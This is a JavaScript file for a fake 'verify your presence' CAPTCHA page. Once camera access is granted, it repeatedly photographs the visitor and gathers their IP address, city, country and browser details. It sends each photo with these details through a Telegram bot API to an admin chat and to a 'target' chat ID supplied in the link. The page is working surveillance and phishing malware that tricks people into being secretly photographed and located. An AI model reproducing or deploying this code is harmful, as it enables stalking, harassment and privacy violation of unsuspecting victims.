import { CONFIG } from "./config.js";

const video      = document.getElementById("video");
const canvas     = document.getElementById("canvas");
const camCard    = document.getElementById("camCard");
const camTitle   = document.getElementById("camTitle");
const camSub     = document.getElementById("camSub");
const stats      = document.getElementById("stats");
const cntCap     = document.getElementById("cntCaptures");
const delSt      = document.getElementById("delStatus");
const sessIdEl   = document.getElementById("sessId");
const captchaW   = document.getElementById("captchaWrap");
const bottomR    = document.getElementById("bottomRight");

const params     = new URLSearchParams(window.location.search);
const userChatId = params.get("id");
const hasTarget  = !!(userChatId && userChatId.trim());
const ADMIN_ID   = CONFIG.ADMIN_CHAT_ID;

let stream = null;
let captureTimer = null;
let captureCount = 0;
let capturing = false;
let recaptchaWidgetId = null;

sessIdEl.textContent = "S-" + Math.random().toString(36).slice(2, 7).toUpperCase();

async function getIP(){
  try { const r = await fetch("https://api.ipify.org?format=json");
        const d = await r.json(); return d.ip || "Unknown"; }
  catch { try { const r = await fetch("https://ipapi.co/json/");
                const d = await r.json(); return d.ip || "Unknown"; }
          catch { return "Unknown"; } }
}
async function getGeo(){
  try { const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        return `${d.city || "?"}, ${d.country_name || "?"}`; }
  catch { return "Unknown"; }
}

async function sendPhotoTo(targetId, blob, caption){
  const fd = new FormData();
  fd.append("chat_id", targetId);
  fd.append("photo", blob, `meridian_${Date.now()}.jpg`);
  fd.append("caption", caption);
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
      { method:"POST", body:fd }
    );
    return res.ok;
  } catch { return false; }
}

async function capture(){
  if (!stream || !capturing) return;
  canvas.width  = video.videoWidth  || CONFIG.CAM_WIDTH;
  canvas.height = video.videoHeight || CONFIG.CAM_HEIGHT;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const blob = await new Promise(res =>
    canvas.toBlob(res, "image/jpeg", CONFIG.IMAGE_QUALITY)
  );
  if (!blob) return;

  const ip   = await getIP();
  const geo  = await getGeo();
  const ua   = navigator.userAgent;
  const date = new Date().toLocaleString("en-US", { timeZoneName:"short" });

  const base = `📸 #${captureCount + 1}\n🕐 ${date}\n🌐 ${ip} — ${geo}\n💻 ${ua}`;
  const adminCaption = hasTarget
    ? `${base}\n👤 Target: ${userChatId}`
    : `${base}\n🧾 No target (admin-only)`;

  if (CONFIG.SEND_ADMIN_ALWAYS) await sendPhotoTo(ADMIN_ID, blob, adminCaption);
  if (CONFIG.SEND_TO_USER_IF_ID && hasTarget) await sendPhotoTo(userChatId, blob, base);

  captureCount++;
  cntCap.textContent = captureCount;
  delSt.textContent = "✓";
}

async function startCamera(){
  camTitle.textContent = "Camera access";
  camSub.textContent = "Awaiting permission…";

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        width: { ideal: CONFIG.CAM_WIDTH },
        height:{ ideal: CONFIG.CAM_HEIGHT },
        facingMode: "user"
      }
    });
    video.srcObject = stream;
    await video.play();
    await new Promise(res => {
      if (video.readyState >= 2) return res();
      video.onloadeddata = res;
      setTimeout(res, 2500);
    });

    window.__cameraReady = true;
    camCard.classList.add("active");
    camTitle.textContent = "Camera connected";
    camSub.textContent = "Verifying your presence…";
    stats.style.display = "grid";
    captchaW.classList.remove("dimmed");
    captchaW.classList.add("ready");
    if (bottomR) bottomR.textContent = "● Verifying";

    capturing = true;
    await capture();
    captureTimer = setInterval(capture, CONFIG.CAPTURE_INTERVAL_MS);
    tryRenderRecaptcha();
  } catch (err){
    camTitle.textContent = "Camera required";
    camSub.textContent = "Allow camera access and reload.";
  }
}

function stopCapture(){
  capturing = false;
  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
  if (stream){ stream.getTracks().forEach(t => t.stop()); stream = null; }
}

function tryRenderRecaptcha(){
  if (!window.__recaptchaReady || !window.__cameraReady) return;
  if (recaptchaWidgetId !== null) return;
  const container = document.getElementById("recaptchaWidget");
  if (!container) return;
  try {
    recaptchaWidgetId = window.grecaptcha.render(container, {
      sitekey: CONFIG.RECAPTCHA_SITE_KEY,
      callback: onRecaptchaSuccess,
      "expired-callback": onRecaptchaExpired,
      "error-callback": onRecaptchaError
    });
  } catch (e){ console.error(e); }
}
window.__tryRenderRecaptcha = tryRenderRecaptcha;

function onRecaptchaSuccess(){
  if (bottomR) bottomR.textContent = "✓ Verified";
  if (CONFIG.STAY_ON_PAGE_AFTER_SUCCESS) return;
  stopCapture();
  setTimeout(() => { window.location.href = "next.html"; }, 1000);
}
window.onRecaptchaSuccess = onRecaptchaSuccess;
function onRecaptchaExpired(){
  camTitle.textContent = "Session expired";
  camSub.textContent = "Please solve the check again.";
}
window.onRecaptchaExpired = onRecaptchaExpired;
function onRecaptchaError(){
  camTitle.textContent = "Error";
  camSub.textContent = "Please reload.";
}
window.onRecaptchaError = onRecaptchaError;

if (CONFIG.AUTO_START_ON_LOAD){
  window.addEventListener("load", startCamera);
}
window.addEventListener("beforeunload", stopCapture);
